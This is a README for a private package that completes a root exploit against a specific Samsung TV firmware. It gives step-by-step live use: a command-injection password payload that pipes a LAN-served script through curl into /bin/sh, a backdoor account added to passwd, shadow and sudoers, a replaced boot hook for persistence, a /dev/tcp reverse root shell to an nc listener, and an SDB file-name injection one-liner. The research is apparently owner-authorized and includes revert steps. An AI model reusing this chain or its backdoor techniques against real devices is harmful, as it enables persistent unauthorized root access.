# persist-root — exploit completion: a root shell and our own account

Private package. It takes the already-proven Remote PC/CIFS root sink and turns
it into what the tracked research deliberately did **not** build: a persistent
root account plus a root shell that survives reboot.

Target: the owner's Samsung `GQ55Q60TGUXZG`, firmware `T-NKLDEUC-2743.0`.
Everything here is offline-tested first; nothing runs on the TV until the live
steps below are explicitly authorized.

## Status

| Step | State |
|---|---|
| Payload grammar (160-byte bound, `${IFS}`, `$( … )`) | implemented, unit-tested |
| Root setup script (account + boot hook + markers) | implemented, unit- and repro-tested |
| Rendered payload driven through the **real pinned sink** | proven offline (`make offline`) |
| Apply / re-apply idempotency / `--revert` | proven offline |
| Password hashing (`$6$`) | implemented, openssl-cross-checked |
| Live run on the TV | **not yet performed** |

## Why a password payload and not a share name

The share-name (`smbpath=`) route needs a quote-breakout, a calibration step,
and depends on TV-side name sanitisation and a 256-byte NetrShareEnum budget.
The password field is the shape that is live-proven to authenticate literally
through PAM and SMB, has no quoting problem, and stages the script in one shot.
Trade-off: 160 bytes. The `pipe` payload is 67 bytes, so the whole setup runs
directly — nothing needs a second trigger.

## The chain

```
Remote PC password field
  → $( ... ) evaluated by root /bin/bash -c in mount.smb.sh
  → curl | /bin/sh  (serve.py serves the body over the LAN)
  → root_setup.sh:
      1. /etc/passwd + /etc/shadow account (uid 4001, group root, /bin/sh)
      2. /etc/sudoers.d/tiz0wn  (only if sudo exists)
      3. /opt/etc/parseinfo.sh boot hook, run as root by AT-HUB.service
         every boot: re-creates the account, appends a boot proof, and
         (if configured) dials a bound root shell back to this Mac
      4. /tmp + /opt evidence markers
```

Persistence rests on `/opt` being the persistent data partition and `/` being a
writable ext4 volume (both static firmware facts), and on `AT-HUB.service`
having no `User=` (root). Rollback is by design: the pre-existing
`/opt/etc/parseinfo.sh` is copied to `.pre-tiz0wn` before first write.

## Offline use

```bash
make -C private/persist-root check      # lint + 87 tests + sink repro + busybox run
```

- `make test` — payload grammar, servable-body contracts, hash vectors,
  apply/re-apply/revert against a throwaway fake root.
- `make offline` — drives the hash-pinned `mount.smb.sh` sink in a `/tmp`
  sandbox over loopback and asserts the injection executes, the account
  appears, the hook lands 0755, a second trigger is idempotent, `--revert`
  restores, and a whitespace password (the tracked negative control) delivers
  nothing.
- `make proof` — the full shape offline: starts the server on loopback, takes
  its printed payload, verifies the served body against the printed hash,
  drives the real pinned sink, then runs the installed hook. The only
  "failure" is the sink's final `/bin/mount`, which does not exist on the Mac.
- `make busybox` — drives apply/revert through real busybox `ash` in a
  container against a fake TV root (the device is busybox, not GNU; a
  GNU-only flag is invisible to the host tests).
- `make ledger-verify` — checks the hash chain **and** the out-of-band
  `LEDGER.head` anchor. `make ledger-chain` checks only the chain, since
  appending legitimately moves the head; re-seal with `--reseal` after
  reviewing the new head.

## Live use

Prerequisites: TV powered on, trusted LAN, Developer Mode on, this Mac's
address matching `private/persist-root` intent, Remote PC open with a disposable
profile, and SDB serial connected for the two verification pushes.

```bash
TOKEN=$(openssl rand -hex 8)
python3 private/persist-root/serve.py \
  --bind <THIS_MAC_IP> --port 18080 \
  --password '<ACCOUNT_PASSWORD>' \
  --token "$TOKEN" \
  --shell-host <THIS_MAC_IP> --shell-port 4444 \
  --ack I-AUTHORIZE-PERSISTENT-ROOT-SETUP
```

`--shell-host/--shell-port` optionally arm the boot-hook root shell. Leave them
off to get only the account plus boot proof.

1. The server prints the served-body SHA-256 and the exact password payload.
   Compare the SHA-256 with `shasum -a 256` over the fetched body out of band.
2. Paste the payload as the Remote PC **password** once, RDP selected, Shared
   Folder enabled, then click Connect and Shared Folder once. One trigger; no
   retry.
3. Verify over SDB (two-push shape, see below).
4. To get an actual root shell: `nc -l <THIS_MAC_IP> 4444` on this Mac, then
   reboot the TV; the hook dials back within ~5 s of network readiness (it
   retries for about a minute, logging `shell=connected attempt=N`). The shell
   is a `/bin/bash` `/dev/tcp` callback — the firmware has no `sshd`.

Authorization phrases: `I-AUTHORIZE-PERSISTENT-ROOT-SETUP` for the delivery,
`I-AUTHORIZE-PERSISTENT-ROOT-VERIFY` for the read-only checks,
`I-AUTHORIZE-PERSISTENT-ROOT-REVERT` for the revert.

### Live checklist

Before pasting the payload, confirm each line; anything unexpected is terminal.

- [ ] `make -C private/persist-root check` was green in this session.
- [ ] `shasum -a 256` of the fetched body equals the server's printed value.
- [ ] Printed payload length is under 160 and contains no spaces.
- [ ] TV is the owned `GQ55Q60TGUXZG` on `T-NKLDEUC-2743.0` (About screen).
- [ ] Remote PC form: RDP (not VNC), fixed lab user, Shared Folder enabled.
- [ ] `nc` listener for the shell is bound to the Mac's LAN address, not
      loopback, when `--shell-host` is armed.
- [ ] Recorded how to revert before triggering.

### Run order

Apply, then verify, then reboot, then confirm the callback, then (only after
that) decide about hardening the helpers.

## Verification (read-only, normal SDB)

A push to a missing path can create the file, so one push proves nothing. The
combined predicate only creates the stage directory when all three conditions
hold, then a second push into `<stage>/attest` can only succeed if it was a
directory:

```bash
sdb -s "$TV_SERIAL" shell "0 appinstall tpk new.tpk\`printf\${IFS}%s\${IFS}<b64>|base64\${IFS}-d|bash\`.tpk"
```

with `<b64>` the base64 of
`grep -q '^tiz0wn:' /etc/passwd&&[ -f /opt/etc/parseinfo.sh ]&&mkdir /home/owner/share/tmp/sdk_tools/r<token>`
— then push `<local>` to `…/r<token>` and again to `…/r<token>/attest`.

Confirm too, by SDB shell:

- `ls -l /opt/etc/parseinfo.sh` → mode 0755, owner root;
- `/opt/etc/parseinfo.sh.pre-tiz0wn` exists if a vendor hook existed;
- `grep tiz0wn /etc/passwd` shows the single account line;
- `cat /opt/usr/home/owner/share/tmp/sdk_tools/tiz0wn-root-<token>.out` shows
  `uid=0(root)`.

A reboot followed by the callback is the persistence proof. Only then is
"persistent root" established.

## Revert

Revert removes the account, the sudoers drop-in, and the hook (restoring
`.pre-tiz0wn` when present; a hook that is not ours is left untouched). It runs
through the same `curl | /bin/sh` sink, so it works even after the helpers are
later hardened:

```bash
python3 private/persist-root/serve.py --bind <IP> --password '<same>' \
  --token "$TOKEN" --revert --ack I-AUTHORIZE-PERSISTENT-ROOT-REVERT
```

and trigger once as above.

`--revert` deliberately needs its own phrase so a mistaken re-trigger is
visible: the server refuses the setup phrase in revert mode and vice versa.

## Changing the password later

Re-running the payload with a different `--password` rewrites the shadow hash.
No revert is needed and the new password takes effect on the next boot too,
because the boot hook re-asserts the configured hash.

## SMACK and boot-hook caveats

- The hook carries the vendor file's SMACK label forward when `chsmack` exists
  (`ls -lZ` field 5). If `AT-HUB.service` runs under a label our replacement
  does not carry, the hook is 0755 but never execs. **Verify after the live run**
  that `/opt/etc/parseinfo.sh` still has its original label and that the boot
  marker appears after a reboot before claiming persistence.
- `AT-HUB` starts early, so the shell loop retries for ~60 s; on a slow network
  that can still miss. A following reboot is the normal retry.

## Honest limits

- `/opt` writability, SMACK labels, and the hook's actual boot execution are
  **unverified on the device**; static evidence only (see
  `research/remotepc-cifs-root/BOOT-PERSISTENCE.md`).
- `AT-HUB.service` may call a vendor `parseinfo.sh` for a reason; the hook
  replaces it, so any vendor behaviour in the original is lost. The
  `.pre-tiz0wn` backup exists for this reason — if the vendor hook did real
  work, append it rather than replace it.
- The TV has no `sshd`; the shell is a `/bin/bash` `/dev/tcp` callback, not an
  SSH login. `bash` presence is checked before connecting.
- `--shell-port` must be reachable *from the TV*; bind `nc` on the Mac LAN
  address, not loopback.
- The body is served over plain HTTP on the LAN (not cryptographically pinned);
  the account hash is inside the body, so a same-LAN spoofer could substitute
  one. Compare the printed SHA-256.
- The `fetch` variant writes the script to `sdk_tools` instead of piping it; it
  needs the extra `cd`/`chmod` bytes and is only worth using for manual
  inspection. `pipe` is the supported live shape.
